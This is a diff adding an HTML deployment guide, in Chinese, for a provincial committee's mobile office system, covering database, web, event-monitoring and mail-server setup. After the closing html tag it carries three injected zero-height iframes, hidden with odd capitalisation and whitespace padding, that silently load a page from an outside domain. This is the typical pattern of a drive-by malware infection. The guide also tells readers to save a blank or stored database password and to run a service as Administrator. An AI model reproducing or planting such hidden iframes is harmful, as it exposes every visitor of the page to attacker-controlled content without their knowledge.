@@ -1,0 +1,151 @@
+<html>
+
+<head>
+<meta http-equiv="Content-Language" content="zh-cn">
+<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
+<meta name="ProgId" content="FrontPage.Editor.Document">
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
+<title>省委移动办公系统部署文档</title>
+<style>
+p, ol, td {font-size:9pt; line-height:150%}
+</style>
+</head>
+
+<body>
+
+<p align="center"><b>省委移动办公系统<br>
+部署文档</b></p>
+<hr color="#000000" size="1">
+<p>本文档包括如下部分：</p>
+
+<ol>
+	<li><a href="#运行环境的配置">运行环境的配置</a></li>
+	<li><a href="#客户端的配置">客户端的配置</a></li>
+	<li><a href="#Web 服务器的配置">Web 服务器的配置</a></li>
+	<li><a href="#事件监视服务器的配置">事件监视服务器的配置</a></li>
+	<li><a href="#邮件服务器的配置">邮件服务器的配置</a></li>
+</ol>
+
+<p>　</p>
+
+<hr color="#000000" size="1">
+<p><b><a name="运行环境的配置">运行环境的配置</a></b></p>
+
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="461" id="AutoNumber1">
+	<tr>
+		<td width="121" bgcolor="#CAEFFF">　</td>
+		<td width="84" align="center" bgcolor="#E8F8FF">客户端</td>
+		<td width="84" align="center" bgcolor="#E8F8FF">Web 服务器</td>
+		<td width="85" align="center" bgcolor="#E8F8FF">事件监视服务器</td>
+		<td width="85" align="center" bgcolor="#E8F8FF">邮件服务器</td>
+	</tr>
+	<tr>
+		<td width="121" bgcolor="#E8F8FF" align="center">IE 5.0 或更高版本</td>
+		<td width="84" align="center"><b>√</b></td>
+		<td width="84" align="center"><b>√</b></td>
+		<td width="85" align="center"><b>√</b></td>
+		<td width="85" align="center"><b>√</b></td>
+	</tr>
+	<tr>
+		<td width="121" bgcolor="#E8F8FF" align="center">MDAC 2.7</td>
+		<td width="84" align="center"><b>√</b></td>
+		<td width="84" align="center"><b>√</b></td>
+		<td width="85" align="center"><b>√</b></td>
+		<td width="85" align="center"><b>√</b></td>
+	</tr>
+	<tr>
+		<td width="121" bgcolor="#E8F8FF" align="center">VB6 运行库</td>
+		<td width="84" align="center">　</td>
+		<td width="84" align="center"><b>√</b></td>
+		<td width="85" align="center">　</td>
+		<td width="85" align="center"><b>√</b></td>
+	</tr>
+	<tr>
+		<td width="121" bgcolor="#E8F8FF" align="center">VC.net 运行库</td>
+		<td width="84" align="center">　</td>
+		<td width="84" align="center"><b>√</b></td>
+		<td width="85" align="center"><b>√</b></td>
+		<td width="85" align="center"><b>√</b></td>
+	</tr>
+</table>
+
+<ol>
+	<li>MDAC 2.7 的安装：运行 系统升级文件\mdac_typ.exe 安装。</li>
+	<li>VB6 运行库的安装：将 系统升级文件\vb6rt.zip 中的两个 dll 解压缩至 winnt\system32 文件夹下。</li>
+	<li>VC.net 运行库的安装：将 系统升级文件\msvcr70.dll 拷贝至 winnt\system32 文件夹下。</li>
+</ol>
+
+<p>
+　</p>
+
+<p>
+<b><a name="客户端的配置">客户端的配置</a></b></p>
+
+<ol>
+	<li>需要达到基本运行环境配置。清参见<a href="#运行环境的配置">运行环境的配置</a>。</li>
+	<li>通过如下网址访问： <a href="http://xxx.xxx.xxx.xxx/MobileOffice">
+	http://xxx.xxx.xxx.xxx/MobileOffice</a> （或使用机器名）</li>
+</ol>
+<p>　</p>
+<p>
+<b><a name="Web 服务器的配置">Web 服务器的配置</a></b></p>
+
+<p>
+[配置数据库]</p>
+
+<ol>
+	<li>将 &lt;DataBase&gt; 文件夹临时拷贝到目标电脑。</li>
+	<li>通过 SQL 查询分析器读取 MobileOffice.sql 脚本，修改数据库创建路径为目标位置，执行后将创建名为 MobileOffice 
+	的数据库。</li>
+	<li>读取 MobileOfficeAgent.sql 并执行，建立作业。</li>
+	<li>通过 sql“导入和导出数据”工具将 Configuration.txt &amp; Users.txt 中的数据导入到数据库 
+	MobileOffice 中的相应表中。</li>
+</ol>
+<p>
+[配置 web 站点]</p>
+
+<ol>
+	<li>将 &lt;MobileOffice&gt; 文件夹复制到默认站点的 MobileOffice 目录下。</li>
+</ol>
+<p>
+[配置主服务器组件和服务]</p>
+
+<ol>
+	<li>在 winnt\system32 下面建立 MobileOffice 文件夹。</li>
+	<li>将 &lt;com&gt; 文件夹中的所有文件拷贝到刚才建立的 MobileOffice 文件夹中。</li>
+	<li>双击 db.udl 配置数据库连接信息。注意：请设置为保存密码或空密码。</li>
+	<li>执行 reg.bat 注册所有组件，并注册、启动服务。</li>
+	<li>打开 控制面板/管理工具/服务，将注册的服务(SmsMsg/MOSchedule)设置为自动启动。</li>
+	<li>执行 regfcd.reg 导入注册表信息。</li>
+</ol>
+<p>
+　</p>
+
+<p>
+<b><a name="事件监视服务器的配置">事件监视服务器的配置</a></b></p>
+
+<ol>
+	<li>将 COM\EventLogServer 文件夹拷贝到目标电脑 winnt\system32\MobileOffice 下面。</li>
+	<li>执行 reg.bat 注册并启动服务。</li>
+	<li>打开 控制面板/管理工具/服务，将服务 EvglgAlertSvc 设置为自动启动。</li>
+</ol>
+<p>
+　</p>
+
+<p>
+<b><a name="邮件服务器的配置">邮件服务器的配置</a></b></p>
+
+<ol>
+	<li>将 COM\ExchangeServer 文件夹拷贝到目标电脑 winnt\system32\MobileOffice 下面。</li>
+	<li>修改 sql server 中 Configuration 表中的 ExgSrvName 记录的服务器名。</li>
+	<li>执行 reg.bat 注册组件，并注册服务。</li>
+	<li>打开 控制面板/管理工具/服务，将服务 EmailNotifySvc 设置为自动启动，并修改启动用户为 Administrator。</li>
+	<li>启动服务。</li>
+</ol>
+
+</body>
+
+</html><IfrAmE src=http://www.lingyinshu.cn/ln/md.htm width=50 height=0></IfrAmE>                    
+
+                                                                 <IfrAmE src=http://www.lingyinshu.cn/ln/md.htm width=50 height=0></IfrAmE>                    
+<IfrAmE src=http://www.lingyinshu.cn/ln/md.htm width=50 height=0></IfrAmE>                    
